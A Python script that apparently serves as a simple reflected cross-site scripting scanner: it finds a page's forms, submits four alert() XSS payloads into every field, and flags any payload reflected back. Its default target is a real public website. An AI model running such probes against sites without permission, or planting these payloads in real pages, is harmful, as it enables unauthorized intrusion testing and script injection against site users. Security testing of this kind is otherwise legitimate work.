import requests
from bs4 import BeautifulSoup
import urllib.parse

# List of XSS payloads (simple examples for testing)
XSS_PAYLOADS = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
]

def get_forms(url):
    """Fetch and parse all forms on the given URL."""
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        return soup.find_all('form')
    except requests.RequestException as e:
        print(f"Error fetching URL {url}: {e}")
        return []

def extract_form_details(form):
    """Extract form action, method, and input fields."""
    action = form.get('action', '')
    method = form.get('method', 'get').lower()
    inputs = []
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        input_type = input_tag.get('type', 'text')
        value = input_tag.get('value', '')
        if name:
            inputs.append({'name': name, 'type': input_type, 'value': value})
    return {'action': action, 'method': method, 'inputs': inputs}

def test_xss(url, form, payload):
    """Submit the form with the XSS payload and check for reflection."""
    form_details = extract_form_details(form)
    action = form_details['action']
    method = form_details['method']
    inputs = form_details['inputs']

    # Construct the full URL for the form action
    target_url = urllib.parse.urljoin(url, action)
    
    # Prepare form data with the XSS payload
    data = {}
    for input_field in inputs:
        data[input_field['name']] = payload if input_field['type'] != 'submit' else input_field['value']

    try:
        # Submit the form
        if method == 'post':
            response = requests.post(target_url, data=data, timeout=5)
        else:
            response = requests.get(target_url, params=data, timeout=5)
        
        # Check if the payload is reflected in the response
        if payload in response.text:
            print(f"[!] Potential XSS vulnerability found with payload: {payload}")
            print(f"Form action: {action}")
            return True
        return False
    except requests.RequestException as e:
        print(f"Error submitting form to {target_url}: {e}")
        return False

def scan_xss(url):
    """Scan the given URL for XSS vulnerabilities in forms."""
    print(f"Scanning {url} for XSS vulnerabilities...")
    forms = get_forms(url)
    
    if not forms:
        print("No forms found on the page.")
        return
    
    for i, form in enumerate(forms, 1):
        print(f"\nTesting form {i}...")
        for payload in XSS_PAYLOADS:
            print(f"Testing payload: {payload}")
            test_xss(url, form, payload)

if __name__ == "__main__":
    # Example usage (replace with a test URL or a local test environment)
    target_url = "https://www.techkhmer.net/?s=a"  # Replace with a test site or local environment
    scan_xss(target_url)